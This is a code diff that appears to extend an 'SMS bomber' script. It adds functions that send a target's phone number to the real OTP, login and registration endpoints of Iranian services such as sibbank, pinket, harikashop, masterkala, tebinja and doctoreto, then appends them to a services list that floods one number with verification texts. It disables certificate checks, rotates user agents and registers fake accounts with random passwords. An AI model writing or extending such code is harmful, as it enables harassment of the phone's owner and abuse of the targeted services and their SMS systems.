@@ -67,6 +67,306 @@ def send_service_safe(service, phone):
 # ==========================
 
 
+def sibbank(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            'accept': 'application/json, text/plain, */*',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.5',
+            'connection': 'keep-alive',
+            'content-type': 'application/json',
+            'host': 'api.sibbank.ir',
+            'origin': 'https://sibbank.ir',
+            'referer': 'https://sibbank.ir/',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'TE': 'trailers',
+            'user-agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        }
+        
+        payload = {
+            "phone_number": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://api.sibbank.ir/v1/auth/login",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[sibbank] Status: {response.status_code}{a}')
+        print(f'{y}[sibbank] Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(sibbank) OTP sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] sibbank error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] sibbank exception: {e}{a}')
+        return False
+
+def dastakht(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "mobile": formatted_phone,
+            "countryCode": 98,
+            "device_os": 2
+        }
+        
+        response = requests.post(
+            "https://dastkhat-isad.ir/api/v1/user/store",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[dastakht] Status: {response.status_code}{a}')
+        print(f'{y}[dastakht] Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(dastakht) OTP sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] dastakht error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] dastakht exception: {e}{a}')
+        return False
+        
+
+def pinket(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Origin": "https://pinket.com",
+            "Referer": "https://pinket.com/"
+        }
+        
+        payload = {
+            "phoneNumber": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://pinket.com/api/cu/v2/phone-verification",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[pinket] Status: {response.status_code}{a}')
+        print(f'{y}[pinket] Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(pinket) OTP sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] pinket error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] pinket exception: {e}{a}')
+        return False
+
+
+def harikashop(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        # تولید اطلاعات تصادفی
+        first_name = "کاربر"
+        last_name = "تست"
+        password = f"Test{random.randint(1000, 9999)}"
+        
+        payload = {
+            'username': formatted_phone,
+            'id_customer': '',
+            'back': 'https://harikashop.com/login?back=my-account',
+            'firstname': first_name,
+            'lastname': last_name,
+            'password': password,
+            'action': 'register',
+            'ajax': '1'
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://harikashop.com",
+            "Referer": "https://harikashop.com/login?back=my-account"
+        }
+        
+        response = requests.post(
+            "https://harikashop.com/login?back=my-account",
+            data=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[harikashop] Status: {response.status_code}{a}')
+        print(f'{y}[harikashop] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(harikashop) Registration request sent! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] harikashop error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] harikashop exception: {e}{a}')
+        return False
+
+
+def masterkala(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Authorization": "Bearer your_token_here",  # اگر نیاز به توکن دارد
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Origin": "https://masterkala.com",
+            "Referer": "https://masterkala.com/"
+        }
+        
+        payload = {
+            "type": "sendotp",
+            "phone": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[masterkala] Status: {response.status_code}{a}')
+        print(f'{y}[masterkala] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(masterkala) OTP sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] masterkala error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] masterkala exception: {e}{a}')
+        return False
+        
+
+
+def tebinja(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": random.choice(user_agents),
+        }
+        
+        payload = {
+            "username": formatted_phone,
+            "captchaHash": "",
+            "captchaValue": ""
+        }
+        
+        response = requests.post(
+            "https://www.tebinja.com/api/v1/users",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] tebinja Status: {response.status_code}{a}')
+        print(f'{y}[Debug] tebinja Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(tebinja) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] tebinja error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] tebinja exception: {e}{a}')
+        return False
+
+def drto(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json", 
+            "app-version": "2.0.0",
+            "User-Agent": random.choice(user_agents),
+        }
+        
+        payload = {
+            "mobile": formatted_phone,
+            "country_id": 205,
+            "captcha": ""
+        }
+        
+        response = requests.post(
+            "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] drto Status: {response.status_code}{a}')
+        print(f'{y}[Debug] drto Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(drto) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] drto error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] drto exception: {e}{a}')
+        return False
+
 def tapsi(phone):
     try:
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
@@ -2254,18 +2554,15 @@ def banimode(phone):
 # ==========================
 
 services = [
-    achareh, alibaba, alldigitall, alopeyk_safir, angeliran,
-    Balad, banimode, barghman, Besparto, bimebazar,
-    bodoroj, candom_shop, Charsooq, dgshahr, digikala,
-    DigikalaJet, divar, drnext, elanza, gap,
-    ghasedak24, hajamooo, ilozi, katonikhan, katoonistore,
-    komodaa, Koohshid, mahabadperfume, malltina, mek,
-    missomister, mo7_ir, mobilex, mootanroo, mrbilit,
-    niktakala, Okala, okorosh, otaghak, paklean_call,
-    payonshoes, pindo, ragham_call, riiha, Sandalestan,
-    shahrfarsh, ShahreSandal, snap, snapp_market, snappshop,
-    sibapp, tapsi, tapsi_food, tetherland, theshoes,
-    torobpay, trip, trip_call, virgool, vitrin_shop
+    achareh, alibaba, alldigitall, alopeyk_safir, angeliran, Balad, banimode, barghman,
+    Besparto, bimebazar, bodoroj, candom_shop, Charsooq, dgshahr, digikala, DigikalaJet,
+    divar, drnext, drto, elanza, gap, ghasedak24, hajamooo, harikashop,
+    ilozi, katonikhan, katoonistore, komodaa, Koohshid, mahabadperfume, malltina, mek,
+    missomister, mo7_ir, mobilex, mootanroo, mrbilit, niktakala, Okala, otaghak,
+    okorosh, paklean_call, payonshoes, pinket, pindo, ragham_call, riiha, Sandalestan,
+    shahrfarsh, ShahreSandal, snap, snapp_market, snappshop, sibapp, sibbank, tapsi,
+    tapsi_food, tetherland, theshoes, torobpay, trip, trip_call, tebinja, virgool,
+    vitrin_shop, dastakht, masterkala
 ]
 
 
